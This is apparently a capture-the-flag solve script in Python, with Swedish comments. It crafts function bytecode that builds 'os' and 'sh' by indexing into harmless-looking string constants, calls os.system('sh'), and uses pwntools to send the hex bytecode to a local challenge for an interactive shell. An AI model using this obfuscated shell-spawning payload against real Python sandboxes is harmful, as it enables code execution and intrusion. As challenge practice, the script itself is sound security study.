import dis
from pwn import *

def f():
    global t
    # ^ vi vill kunna assigna till t utan att den hamnar i co_varnames
    try:
        # Alla konstanter (co_consts)
        ('Just nu är klockan ','time', 1, ' (Copyright ', ')\n',\

        # Alla namn, förkortar time till t (co_names) 
        round,__import__,t,system)
    except: pass
    # Vi använder t istället för bara 1 eftersom 1+1+1+1 förkortas automatiskt till 4
    # av Pythons compiler och vi vill ha alla explicita BINARY_ADD
    t=1
    return __import__('Just nu är klockan '[t+t+t+t+t+t+t+t+t+t+t+t+t]+'Just nu är klockan '[t+t]).system('Just nu är klockan '[t+t]+' (Copyright '[t+t+t+t+t+t+t+t+t])
dis.dis(f)

pl = f.__code__.co_code.hex()

# io = remote(...)
io = process('./chall.py')
io.sendlineafter(b'>>> ', b'2')
io.sendline(pl.encode())
io.sendlineafter(b'>>> ', b'1')
io.interactive()